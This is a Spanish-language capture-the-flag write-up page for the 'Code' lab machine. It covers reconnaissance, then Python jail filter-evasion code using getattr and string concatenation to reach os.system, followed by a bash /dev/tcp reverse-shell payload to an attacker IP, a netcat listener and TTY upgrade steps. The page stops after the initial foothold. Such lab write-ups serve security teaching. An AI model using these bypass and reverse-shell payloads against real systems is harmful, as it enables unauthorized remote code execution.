<!DOCTYPE html><html lang="es"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><title>Code - Writeups Hacking</title><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/writeups-hacking/_astro/ClientRouter.astro_astro_type_script_index_0_lang.DZnDNxNb.js"></script><link rel="stylesheet" href="/writeups-hacking/_astro/_id_.Cua1sQfT.css">
<style>.astro-route-announcer{position:absolute;left:0;top:0;clip:rect(0 0 0 0);clip-path:inset(50%);overflow:hidden;white-space:nowrap;width:1px;height:1px}/*! tailwindcss v4.1.12 | MIT License | https://tailwindcss.com */html{color:#fff;background:#13151a;font-family:system-ui,sans-serif}body{padding-inline:calc(var(--spacing,.25rem)*5);padding-block:calc(var(--spacing,.25rem)*20);place-content:center;display:grid}body>div{width:100%}@media (min-width:40rem){body>div{max-width:40rem}}@media (min-width:48rem){body>div{max-width:48rem}}@media (min-width:64rem){body>div{max-width:64rem}}@media (min-width:80rem){body>div{max-width:80rem}}@media (min-width:96rem){body>div{max-width:96rem}}body.writeup-page{margin:calc(var(--spacing,.25rem)*0);padding-inline:calc(var(--spacing,.25rem)*0);padding-top:calc(var(--spacing,.25rem)*4);padding-bottom:calc(var(--spacing,.25rem)*20)}@media (min-width:40rem){body.writeup-page{padding-inline:calc(var(--spacing,.25rem)*5)}}@media (min-width:48rem){body.writeup-page{padding-inline:calc(var(--spacing,.25rem)*5)}}@media (min-width:64rem){body.writeup-page{padding-inline:calc(var(--spacing,.25rem)*10)}}@keyframes astroFadeInOut{0%{opacity:1}to{opacity:0}}@keyframes astroFadeIn{0%{opacity:0;mix-blend-mode:plus-lighter}to{opacity:1;mix-blend-mode:plus-lighter}}@keyframes astroFadeOut{0%{opacity:1;mix-blend-mode:plus-lighter}to{opacity:0;mix-blend-mode:plus-lighter}}@keyframes astroSlideFromRight{0%{transform:translate(100%)}}@keyframes astroSlideFromLeft{0%{transform:translate(-100%)}}@keyframes astroSlideToRight{to{transform:translate(100%)}}@keyframes astroSlideToLeft{to{transform:translate(-100%)}}@media (prefers-reduced-motion){::view-transition-group(*),::view-transition-old(*),::view-transition-new(*){animation:none!important}[data-astro-transition-scope]{animation:none!important}}
</style><style>[data-astro-transition-scope="astro-gnbmvgz7-1"] { view-transition-name: writeups-title-group; }@layer astro { ::view-transition-old(writeups-title-group) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }::view-transition-new(writeups-title-group) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(writeups-title-group) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(writeups-title-group) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-gnbmvgz7-1"],
			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-gnbmvgz7-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-gnbmvgz7-1"],
			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-gnbmvgz7-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-gnbmvgz7-1"],
			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-gnbmvgz7-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-gnbmvgz7-1"],
			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-gnbmvgz7-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-utklmmm4-2"] { view-transition-name: img-code; }@layer astro { ::view-transition-old(img-code) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }::view-transition-new(img-code) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(img-code) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(img-code) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-utklmmm4-2"],
			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-utklmmm4-2"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-utklmmm4-2"],
			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-utklmmm4-2"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-utklmmm4-2"],
			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-utklmmm4-2"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-utklmmm4-2"],
			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-utklmmm4-2"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-3hsjm4tw-3"] { view-transition-name: title-code; }@layer astro { ::view-transition-old(title-code) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }::view-transition-new(title-code) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(title-code) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(title-code) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-3hsjm4tw-3"],
			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-3hsjm4tw-3"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-3hsjm4tw-3"],
			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-3hsjm4tw-3"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-3hsjm4tw-3"],
			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-3hsjm4tw-3"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-3hsjm4tw-3"],
			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-3hsjm4tw-3"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }</style></head> <body class="writeup-page"> <div class="layout-body"> <!-- Contenedor principal --> <main class="w-full mx-auto px-4 sm:px-6 lg:px-12 prose prose-invert max-w-full">   <div class="flex flex-col md:flex-row gap-12"> <!-- Aside --> <aside class="flex flex-col items-center gap-4 w-full md:w-64"> <div class="sticky top-1 flex flex-col items-center"> <!-- Título principal y logo --> <div class="text-center" data-astro-transition-scope="astro-gnbmvgz7-1"> <div class="flex flex-row items-center gap-1 justify-center"> <span class="text-3xl font-extrabold text-[#bfff00]">Writeups</span> <img src="/code/hacker.svg" alt="Logo" class="w-10 h-10"> </div> <span class="text-3xl font-extrabold text-[#bfff00] mt-0">Hacking</span> </div> <!-- Botón volver --> <a href="/" class="mt-4 text-xl text-white opacity-70 hover:underline">
← Volver atrás
</a> <!-- Imagen de la máquina --> <img class="rounded w-full max-w-xs md:w-55 h-auto mt-6" src="/code/Code_logo.png" alt="Code" data-astro-transition-scope="astro-utklmmm4-2"> </div> </aside> <!-- Main Content --> <main class="w-full md:max-w-3xl flex-1"> <h1 class="text-6xl font-bold mb-6" data-astro-transition-scope="astro-3hsjm4tw-3">Code</h1> <!-- Skills Section estilo Markdown con colores --> <div class="mb-8 border-4 border-[#bfff00] rounded-lg p-6 bg-[#0f0f0f]"> <h3 class="text-3xl font-bold text-center text-[#CCCCCC] py-2
                    hover:text-[#888888] hover:border-[#888888] transition-colors duration-300">
Skills
</h3> <hr class="my-0 border-t-4 border-[#bfff00]"> <ul class="w-full mt-4 flex flex-wrap justify-center gap-2 sm:gap-3"> <li class="inline-block text-center bg-[#1f1f1f] text-[#bfff00] px-3 py-2 sm:px-4 sm:py-2 rounded-full font-medium
              hover:bg-[#888888] hover:text-black transition-colors duration-300 break-words text-sm sm:text-base max-w-full"> 1. Web Enumeration </li><li class="inline-block text-center bg-[#1f1f1f] text-[#bfff00] px-3 py-2 sm:px-4 sm:py-2 rounded-full font-medium
              hover:bg-[#888888] hover:text-black transition-colors duration-300 break-words text-sm sm:text-base max-w-full"> 2. Python Jail (Reverse Shell Restriction Bypass) </li><li class="inline-block text-center bg-[#1f1f1f] text-[#bfff00] px-3 py-2 sm:px-4 sm:py-2 rounded-full font-medium
              hover:bg-[#888888] hover:text-black transition-colors duration-300 break-words text-sm sm:text-base max-w-full"> 3. Database SQLite File Enumeration </li><li class="inline-block text-center bg-[#1f1f1f] text-[#bfff00] px-3 py-2 sm:px-4 sm:py-2 rounded-full font-medium
              hover:bg-[#888888] hover:text-black transition-colors duration-300 break-words text-sm sm:text-base max-w-full"> 4. Cracking Hashes </li><li class="inline-block text-center bg-[#1f1f1f] text-[#bfff00] px-3 py-2 sm:px-4 sm:py-2 rounded-full font-medium
              hover:bg-[#888888] hover:text-black transition-colors duration-300 break-words text-sm sm:text-base max-w-full"> 5. Directory Path Traversal Restriction Bypass </li><li class="inline-block text-center bg-[#1f1f1f] text-[#bfff00] px-3 py-2 sm:px-4 sm:py-2 rounded-full font-medium
              hover:bg-[#888888] hover:text-black transition-colors duration-300 break-words text-sm sm:text-base max-w-full"> 6. Abusing Sudoers (Privelege Escalation) </li> </ul> </div> <!-- Markdown Content --> <div class="markdown space-y-4"> <h3 id="descripción">Descripción</h3>
<p>Code es una máquina Linux sencilla que cuenta con una aplicación web Python Code Editor vulnerable a la ejecución remota de código mediante un bypass de Python Jail. Después de obtener acceso como usuario de producción de la aplicación, se pueden encontrar credenciales descifrables en un archivo de base de datos sqlite3. Con estas credenciales, se obtiene acceso a otro usuario, martin , que tiene permisos sudo para un script de utilidad de respaldo, backy.sh . Este script incluye una sección de código vulnerable que, cuando se explota, nos permite escalar nuestros privilegios creando una copia de la carpeta raı́z.</p>
<h3 id="objetivos">Objetivos</h3>
<h4 id="objetivo-general">Objetivo general</h4>
<p>Desarrollar habilidades de análisis y explotación en entornos restringidos de ejecución de código en Python (Python Jail), con el fin de fortalecer el conocimiento sobre vulnerabilidades, evasión de filtros y seguridad en aplicaciones que ejecutan código dinámico.. Como es el caso de la Máquina Code.</p>
<h4 id="objetivos-especificos">Objetivos Especificos</h4>
<ul>
<li>Comprender el funcionamiento interno del lenguaje Python, incluyendo introspección, objetos y estructuras dinámicas como builtins , getattr, eval y exec.</li>
<li>Identificar y evadir mecanismos de restricción artificial (filtros, listas negras, entornos limitados) impuestos en un entorno tipo jail.</li>
<li>Aplicar técnicas ofensivas de bypass, como reconstrucción de funciones prohibidas, manipulación de clases y uso de expresiones indirectas para ejecutar código arbitrario.</li>
<li>Evaluar los riesgos de seguridad asociados con la ejecución de código Python no controlado, como el uso inseguro de eval, input o exec en aplicaciones web o automatizadas.<br></li>
</ul>
<h3 id="analisis-de-vulnerabilidades">Analisis de Vulnerabilidades</h3>
<h4 id="reconocimiento-inicial">Reconocimiento Inicial</h4>
<p>Se comenzó realizando un análisis inicial sobre el sistema, cuyo objetivo principal fue comprobar la disponibilidad y accesibilidad del equipo o servicio objetivo desde el segmento de red en el que se estaba operando. Esta verificación resultó fundamental para asegurar que la comunicación entre el host atacante y el sistema de destino fuera posible antes de iniciar fases más avanzadas de la evaluación. Para llevar a cabo esta tarea de reconocimiento preliminar, se emplearon herramientas de terminal ampliamente utilizadas en auditorı́as de seguridad:</p>
<p><strong>Ping</strong>, para enviar solicitudes ICMP al host y confirmar su capacidad de respuesta, además de obtener información básica como ser el tipo de sistema operativo ya sea Windows o Linux mediante el <strong>TTL</strong>.</p>
<p><a href="/code/ping.png"><img src="/code/ping.png" alt="Ejecución del comando ping"></a></p>
<p><strong>Nmap</strong>, para efectuar un escaneo de puertos y servicios disponibles, identificando posibles puntos de entrada o servicios expuestos que pudieran ser analizados en etapas posteriores.</p>
<p><a href="/code/nmap.png"><img src="/code/nmap.png" alt="Ejecución del comando ping"></a></p>
<p>Este proceso inicial permitió obtener una visión general del estado de la red y del sistema objetivo, sirviendo como base para definir la estrategia y priorizar las acciones en las siguientes fases de la evaluación.</p>
<h3 id="analisis-de-los-servicios-activos">Analisis de los servicios activos</h3>
<p>Seguidamente, una vez identificados los servicios activos en el sistema objetivo en este caso, el puerto 22/TCP, correspondiente al servicio SSH (Secure Shell), y el puerto 5000/TCP, que aloja un servicio web se procede a realizar un escaneo más exhaustivo y especı́fico sobre cada uno de ellos.</p>
<h4 id="puerto-22-ssh">Puerto 22 (SSH)</h4>
<p>El hecho de que el puerto 22/TCP se encuentre activo indica que el sistema dispone de un servicio SSH (Secure Shell) en ejecución, lo que permite establecer una conexión remota segura mediante el uso de protocolos de cifrado para la transmisión de datos. Este servicio, comúnmente utilizado para la administración de servidores y dispositivos de red, brinda acceso a una lı́nea de comandos del sistema de destino, desde la cual es posible ejecutar comandos y realizar tareas de gestión.</p>
<p>La presencia de SSH implica que, si se dispone de credenciales válidas o se logra explotar alguna vulnerabilidad en su configuración o implementación, un atacante podrı́a obtener control remoto sobre el sistema. Por este motivo, resulta fundamental identificar la versión exacta del servicio, verificar la fortaleza de los mecanismos de autenticación implementados y evaluar la existencia de vulnerabilidades conocidas asociadas a esa versión especı́fica.</p>
<p>En el contexto de una evaluación de seguridad, este hallazgo se considera un punto de interés clave, ya que un servicio SSH mal configurado o desactualizado puede convertirse en una puerta de entrada directa al sistema.</p>
<p>El analisis demuestra que este servicio se esta ejecutando en un sistema operativo ubuntu como se muestra en la
siguiente imagen:</p>
<p><a href="/code/ssh.png"><img src="/code/ssh.png" alt="Servicio de SSH (Secure Shell)"></a></p>
<h4 id="puerto-5000-servicio-web">Puerto 5000 (Servicio Web)</h4>
<p>Al ejecutar el comando <strong>whatweb</strong> desde la terminal, se obtiene información detallada acerca de las tecnologı́as y frameworks que utiliza el servicio web en el puerto correspondiente. El resultado de este análisis revela que el servicio está siendo ejecutado mediante <strong>Gunicorn 20.0.4</strong>.</p>
<p><strong>Gunicorn</strong> (Green Unicorn) es un servidor WSGI para aplicaciones Python ampliamente utilizado en entornos de producción debido a su simplicidad y eficiencia. La identificación de su versión especı́fica, en este caso <strong>20.0.4</strong>, resulta relevante ya que permite verificar si existen vulnerabilidades conocidas o configuraciones inseguras asociadas a dicha versión. Este tipo de información es fundamental para orientar fases posteriores de análisis, como la búsqueda en bases de datos de vulnerabilidades (por ejemplo, CVE o Exploit-DB) y la evaluación de posibles vectores de ataque contra el servicio.</p>
<p><a href="/code/port5000.png"><img src="/code/port5000.png" alt="Servicio web puerto 5000 (Gunicorn)"></a></p>
<p>Al acceder al servicio web mediante un navegador utilizando la URL <a href="http://10.10.11.62:5000">http://10.10.11.62:5000</a>, se observa que el sistema está ejecutando un editor de código para el lenguaje de programación Python. Esta interfaz permite al usuario escribir y ejecutar código Python directamente desde el navegador, lo cual facilita la interacción y el desarrollo rápido dentro del entorno proporcionado.</p>
<p>Si bien esta funcionalidad puede resultar muy útil en contextos controlados y para propósitos legı́timos, también implica un nivel considerable de riesgo desde la perspectiva de seguridad. La capacidad de ejecutar código remotamente sin las debidas restricciones o controles puede exponer el sistema a vulnerabilidades crı́ticas, tales como la ejecución arbitraria de código, escalación de privilegios o acceso no autorizado a recursos sensibles.</p>
<p><a href="/code/webpage.png"><img src="/code/webpage.png" alt="Pagina web que corre un editor de código en lı́nea"></a></p>
<h3 id="explotación-del-sistema">Explotación del Sistema</h3>
<p>Dado que podemos ejecutar código directamente desde la página de inicio, no es necesario crear una cuenta, a menos que queramos guardar o realizar un seguimiento de nuestro trabajo. Primero intentaremos cargar algunos módulos comunes, como import, os, write u open, ya que son fundamentales para ejecutar cargas útiles que interactúan con el sistema subyacente. Sin embargo, veremos inmediatamente que hay un filtro para impedirnos utilizar palabras clave restringidas y bloquear el uso de funciones y módulos potencialmente peligrosos.</p>
<p><a href="/code/payload1.png"><img src="/code/payload1.png" alt="Implementación de reglas para impedir el uso de cargas útiles"></a></p>
<p>Dada la presencia de mecanismos de filtrado que restringen la ejecución directa de código en el servicio web, se torna indispensable identificar métodos para eludir estos filtros con el fin de avanzar en la evaluación de seguridad. Para ello, se llevó a cabo una investigación exhaustiva utilizando palabras clave como “python bypass” en motores de búsqueda y bases de datos especializadas.</p>
<p>Como resultado, se localizaron múltiples artı́culos y recursos técnicos que describen diversas técnicas para superar las restricciones impuestas en entornos Python. Estas técnicas incluyen manipulación avanzada de la sintaxis, uso de codificaciones alternativas, construcción dinámica de código y explotación de vulnerabilidades en componentes especı́ficos.</p>
<p>La información recopilada servirá como fundamento para la implementación de pruebas controladas destinadas a validar la efectividad de los filtros y detectar posibles brechas que puedan ser explotadas.</p>
<h4 id="uso-de-build-in">Uso de build-in</h4>
<p>En Python, los built-in (o funciones y objetos incorporados) son un conjunto de funciones, excepciones y tipos de datos que están disponibles de forma inmediata sin necesidad de importar ningún módulo o librerı́a adicional. Estos elementos forman parte del núcleo del lenguaje y proporcionan funcionalidades esenciales para realizar tareas comunes de programación.</p>
<h3 id="uso-de-getattr-para-evadir-restricciones-en-python">Uso de getattr para evadir restricciones en Python</h3>
<p>La función incorporada getattr(objeto, nombre atributo) en Python permite acceder dinámicamente a los atributos o métodos de un objeto usando el nombre del atributo como una cadena. Este comportamiento es especialmente útil para evadir filtros y restricciones que bloquean el acceso directo a funciones o métodos sensibles. En entornos con mecanismos de seguridad que detectan y bloquean llamadas explı́citas a funciones peligrosas (por ejemplo, os.system), getattr puede ser usada para ocultar la intención real del código. Como en el siguiente código:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#E1E4E8">test </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> getattr</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">__self__</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'__im'</span><span style="color:#F97583"> +</span><span style="color:#9ECBFF"> 'port__'</span><span style="color:#E1E4E8">) (</span><span style="color:#9ECBFF">'o'</span><span style="color:#F97583"> +</span><span style="color:#9ECBFF"> 's'</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#79B8FF">getattr</span><span style="color:#E1E4E8">(test, </span><span style="color:#9ECBFF">'sy'</span><span style="color:#F97583"> +</span><span style="color:#9ECBFF"> 'stem'</span><span style="color:#E1E4E8">)( </span><span style="color:#9ECBFF">'whoami'</span><span style="color:#E1E4E8">)</span></span></code></pre>
<p>Otro método efectivo para evadir restricciones en entornos Python está explicado en un
<a href="https://medium.com/soulsecteam/some-simple-bypass-tricks-8f02455b098d" class="text-blue-500 font-bold underline hover:text-blue-700 transition">
artículo publicado en Medium
</a>. A continuación, se presenta el fragmento de código descrito en dicho artículo:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#E1E4E8">[w </span><span style="color:#F97583">for</span><span style="color:#E1E4E8"> w </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">..</span><span style="color:#79B8FF">__class__</span><span style="color:#E1E4E8">.__base__.</span><span style="color:#79B8FF">__subclasses__</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">if</span><span style="color:#E1E4E8"> w.</span><span style="color:#79B8FF">__name__</span><span style="color:#F97583">==</span><span style="color:#9ECBFF">'Quitter'</span><span style="color:#E1E4E8">][</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">].</span><span style="color:#79B8FF">__init__</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">__globals__</span><span style="color:#E1E4E8">[</span><span style="color:#9ECBFF">'sy'</span><span style="color:#F97583">+</span><span style="color:#9ECBFF">'s'</span><span style="color:#E1E4E8">].modules[</span><span style="color:#9ECBFF">'o'</span><span style="color:#F97583">+</span><span style="color:#9ECBFF">'s'</span><span style="color:#E1E4E8">].</span><span style="color:#79B8FF">__dict__</span><span style="color:#E1E4E8">[</span><span style="color:#9ECBFF">'sy'</span><span style="color:#F97583">+</span><span style="color:#9ECBFF">'stem'</span><span style="color:#E1E4E8">](</span><span style="color:#9ECBFF">'ls'</span><span style="color:#E1E4E8">)</span></span></code></pre>
<h4 id="ejecución-de-comandos-en-el-sistema">Ejecución de comandos en el sistema</h4>
<p>Esto nos permitirá ejecutar comandos de shell sin utilizar palabras clave prohibidas como <strong>≪import≫</strong> u <strong>≪os≫</strong> directamente, utilizando la concatenación de cadenas, es decir, <strong>≪o≫</strong> + <strong>≪s≫</strong>. Sin embargo, tras ejecutar el código, no vemos ningún resultado. Esto sugiere que, aunque el código se esté ejecutando en el host, el resultado no se está devolviendo al frontend. Para verificar si se está ejecutando en el host, modificaremos nuestro enfoque e intentaremos redirigir el resultado a nuestra máquina utilizando un sencillo listener con el comando <strong>tcpdump</strong> para capturar la respuesta del comando <strong>ping</strong> ejecutado desde el servicio web.</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#E1E4E8">test </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> getattr</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">__self__</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'__im'</span><span style="color:#F97583"> +</span><span style="color:#9ECBFF"> 'port__'</span><span style="color:#E1E4E8">) (</span><span style="color:#9ECBFF">'o'</span><span style="color:#F97583"> +</span><span style="color:#9ECBFF"> 's'</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#79B8FF">getattr</span><span style="color:#E1E4E8"> (test, </span><span style="color:#9ECBFF">'sy'</span><span style="color:#F97583"> +</span><span style="color:#9ECBFF"> 'stem'</span><span style="color:#E1E4E8">)(</span><span style="color:#9ECBFF">'ping -c 1 10.10.x.x'</span><span style="color:#E1E4E8">)</span></span></code></pre>
<p>Ejecución del código python en la web:</p>
<p><a href="/code/payload2.png"><img src="/code/payload2.png" alt="Código python en la web"></a></p>
<p>Recibimos respuesta por parte del servido al ejecutar el comandon <strong>ping</strong>:</p>
<p><a href="/code/term1.png"><img src="/code/term1.png" alt="Respuesta del comando ping"></a></p>
<p>Seguidamente ejecutaremos el siguiente código en el servicio web para obtener una <strong>shell inversa</strong> mediante <strong>Netcat</strong>:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#E1E4E8">test </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> getattr</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">__self__</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'__im'</span><span style="color:#F97583"> +</span><span style="color:#9ECBFF"> 'port__'</span><span style="color:#E1E4E8">)(</span><span style="color:#9ECBFF">'o'</span><span style="color:#F97583"> +</span><span style="color:#9ECBFF"> 's'</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#79B8FF">getattr</span><span style="color:#E1E4E8">(test, </span><span style="color:#9ECBFF">'sy'</span><span style="color:#F97583"> +</span><span style="color:#9ECBFF"> 'stem'</span><span style="color:#E1E4E8">)(</span><span style="color:#9ECBFF">'bash -c "bash -i >&#x26; /dev/tcp/10.10.x.x/443 0>&#x26;1" '</span><span style="color:#E1E4E8">)</span></span></code></pre>
<p>Y ejecutamos en nuestra máquina de atacante <strong>Netcat</strong> en el puerto que especificamos en el comando anterior:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">nc</span><span style="color:#79B8FF"> -lnvp</span><span style="color:#79B8FF"> 443</span></span></code></pre>
<p>Al ejecutar el código en el servicio web, este establece una conexión de retorno hacia nuestra máquina atacante, otorgándonos una <strong>shell inversa</strong>. Este tipo de acceso nos permite interactuar directamente con el sistema objetivo como si estuviéramos trabajando desde su propia terminal, posibilitando la ejecución de comandos, la navegación por el sistema de archivos y la recolección de información sensible en tiempo real.</p>
<p><a href="/code/payload3.png"><img src="/code/payload3.png" alt="Ejecucion del código en el servicio web para obtener una shell inversa"></a></p>
<p>Seguidamente, se procede a realizar un tratamiento de la <strong>TTY</strong> con el fin de mejorar la interacción con la sesión obtenida. Este proceso incluye la configuración de una terminal completamente funcional que soporte caracterı́sticas como edición de lı́nea, autocompletado y manejo de señales. De esta manera, al presionar combinaciones de teclas como <strong>Ctrl + C</strong>, la conexión no se interrumpe y se mantiene la estabilidad de la sesión.</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># En la shell inversa obtenida, ejecutar:</span></span>
<span class="line"><span style="color:#B392F0">python3</span><span style="color:#79B8FF"> -c</span><span style="color:#9ECBFF"> ’import</span><span style="color:#9ECBFF"> pty</span><span style="color:#E1E4E8">; </span><span style="color:#B392F0">pty.spawn(</span><span style="color:#B392F0">"/bin/bash"</span><span style="color:#E1E4E8">)’</span></span>
<span class="line"><span style="color:#B392F0">Ctrl+Z</span><span style="color:#6A737D"> # Presionar las teclas</span></span>
<span class="line"><span style="color:#B392F0">stty</span><span style="color:#9ECBFF"> raw</span><span style="color:#79B8FF"> -echo</span><span style="color:#E1E4E8">; </span><span style="color:#79B8FF">fg</span></span>
<span class="line"><span style="color:#B392F0">reset</span><span style="color:#9ECBFF"> xterm</span></span>
<span class="line"><span style="color:#F97583">export</span><span style="color:#E1E4E8"> TERM</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">xterm</span></span></code></pre> </div> </main> </div>  <footer class="py-1 mt-12 text-gray-400" style="background-color: #13151a;"> <div class="max-w-screen-xl mx-auto px-4 text-center space-y-0 text-sm"> <p>&copy; 4jh4ck 2025 - Writeups Hacking. Todos los derechos reservados.</p> <p>
Design by: 4jh4ck, Original Design:
<a href="https://github.com/midudev" target="_blank" rel="noopener" class="hover:text-[#bfff00] transition-colors">@Midudev</a> </p> <p>
Theme Inspiration:
<a href="https://github.com/midudev/astro-5-dev-books" target="_blank" rel="noopener" class="hover:text-[#bfff00] transition-colors">astro-5-dev-books</a> </p> </div> </footer>  </main> </div> </body></html>